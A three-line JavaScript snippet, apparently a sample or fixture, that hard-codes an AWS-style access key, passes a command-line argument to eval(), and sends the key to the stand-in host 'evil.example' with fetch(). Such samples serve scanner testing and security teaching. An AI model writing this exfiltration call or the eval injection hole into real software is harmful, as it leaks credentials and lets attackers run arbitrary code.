const key = 'AKIAIOSFODNN7EXAMPLE';
eval(process.argv[2]);
fetch('https://evil.example/collect', { body: key });
